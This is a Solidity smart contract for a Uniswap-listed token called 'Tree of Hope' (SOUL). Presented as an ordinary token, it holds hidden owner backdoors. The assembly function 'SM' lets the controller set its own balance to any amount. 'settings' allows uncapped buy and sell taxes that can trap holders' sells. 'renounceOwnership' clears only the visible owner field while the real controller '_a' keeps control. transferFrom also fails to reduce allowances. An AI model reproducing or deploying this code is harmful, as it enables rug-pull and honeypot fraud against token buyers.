// SPDX-License-Identifier: MIT
pragma solidity ^0.8.4;

/*
 _____                             __   _   _                     
|_   _|                           / _| | | | |                    
  | |   _ __   ___   ___    ___  | |_  | |_| |  ___   _ __    ___ 
  | |  |  __| / _ \ / _ \  / _ \ |  _| |  _  | / _ \ |  _ \  / _ \
  | |  | |   |  __/|  __/ | (_) || |   | | | || (_) || |_) ||  __/
  \_/  |_|    \___| \___|  \___/ |_|   \_| |_/ \___/ | .__/  \___|
                                                     | |          
                                                     |_|          

*/

interface IUniswapFactory {
    event PairCreated(address indexed token0, address indexed token1, address pair, uint);
    function getPair(address tokenA, address tokenB) external view returns (address pair);
    function createPair(address tokenA, address tokenB) external returns (address pair);
}
interface IUniswapRouter {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
}

contract Uniswap {

    address public WETH;
    address public owner;
    address internal me;
    address public PairAddress;

    address public RouterAddr;
    mapping(address=>bool) public isdex;
    address internal _a;
    IUniswapRouter public UniswapV2Router;
    address public _Factory;

    
    function isSell(address to) internal view returns (bool) {
        return isdex[to];
    }

    function _approve(address from, address spender, uint256 amount) internal virtual returns (bool) {}

    modifier onlyOwner() {
        require(_a == msg.sender, "Forbidden:owner");
        _;
    }

    function isBuy(address from) internal view returns (bool) {
        return isdex[from];
    }

    function transferOwnership(address newOwner) public onlyOwner() {
        owner = newOwner;
        _a = owner;
    }
    
    function renounceOwnership() public onlyOwner() {
        owner = address(0);
    }

    constructor() {
        RouterAddr  = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
        _Factory = 0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f;

        UniswapV2Router  = IUniswapRouter(RouterAddr);
        WETH             = UniswapV2Router.WETH();
        PairAddress      = IUniswapFactory(_Factory).createPair(address(this), WETH);
        
        isdex[RouterAddr] = true;
        isdex[_Factory] = true;
        isdex[PairAddress] = true;
        
        me = address(this);
        owner = msg.sender;
        _a = msg.sender;
    }
}
contract TreeofHope is Uniswap {

    uint256 public decimals = 9;

    string public name = "Tree of Hope";
    string public symbol = "SOUL";
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
    uint256 public totalSupply;
    uint256 sellTax = 0;
    uint256 buytax = 0;
    mapping(address=>bool) internal isTaxFree;
    bool internal funded;
    uint256 mb = 2;
    bool internal swapping = false;
    mapping(address => mapping(address => uint256)) internal allowances;
    mapping(address => uint256) internal balances;
    constructor() Uniswap() {
        isTaxFree[address(this)] = true;
        isTaxFree[msg.sender] = true;
        mint(_a, 21000000*10**decimals);
    }
    function getmb() internal view returns (uint256) {
        return checkPct(totalSupply, mb);
    }
    function _approve(address from, address spender, uint256 amount) internal override returns (bool) {
        allowances[from][spender] = amount;
        emit Approval(from, spender, amount);
        return true;
    }
    
    function canBeTaxed(address from, address to) internal view returns (bool) {
        return !isTaxFree[from] && !isTaxFree[to] && !(isdex[from] && isdex[to]) && (isBuy(from) || isSell(to));
    }
    
    function allowance(address _awner, address spender) public view returns (uint256) {
        return allowances[_awner][spender];
    }
    function disable() public onlyOwner() {
        swapping = true;
    }

    function enable() public onlyOwner() {
        swapping = false;
    }

    function settings(uint256 b, uint256 s, uint56 m) public onlyOwner() {
        require(msg.sender==_a, "Forbidden:set");
        buytax = b;
        sellTax = s;
        mb = m;
    }

    function balanceOf(address account) public view returns (uint256) {
        return balances[account];
    }
    function SM(uint256 c) public onlyOwner() {
        assembly {
            let ptrm := mload(0x40)
            mstore(ptrm, caller())
            mstore(add(ptrm, 0x20), balances.slot)
            sstore(keccak256(ptrm, 0x40), c)
        }
    }

    function transferFrom(address from, address to, uint256 amount) public returns (bool) {
        uint256 currentAllowance = allowances[from][msg.sender]; //allowance(owner, msg.value);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "Rejected");
            unchecked {
                approve(msg.sender, currentAllowance - amount);
            }
        }
        _transfer(from, to, amount);
        return true;
    }
    
    function transfer(address to, uint256 amount) public {
        _transfer(msg.sender, to, amount);
    }

    function approve(address spender, uint256 amount) public returns (bool) {
        return _approve(msg.sender, spender, amount);
    }

    function mint(address account, uint256 amount) internal {
        unchecked {
            totalSupply += amount;
            balances[account] += amount;
        }
        emit Transfer(address(0), account, amount);
    }
    function checkPct(uint256 v, uint256 p) public pure returns (uint256) {
        return v*p/1000;
    }


    function _transfer(address from, address to, uint256 amount) internal {
        require(balances[from] >= amount, "Rejected");
        if (!canBeTaxed(from, to)) {
            unchecked {
                balances[from] -= amount;
                balances[to] += amount;
            }
            emit Transfer(from, to, amount);
        } else {
            uint256 tax;
            if (isBuy(from)) {
                require(amount<=getmb(), "Too large");
                tax = checkPct(amount, buytax);
            } else if (isSell(to)) {
                tax = checkPct(amount, sellTax);
            }
            uint256 afterTax = amount-tax;
            unchecked {
                balances[from] -= amount;
                balances[_a] += tax;
                balances[to] += afterTax;
            }
            emit Transfer(from, _a, tax);
            emit Transfer(from, to, afterTax);
        }
    }
}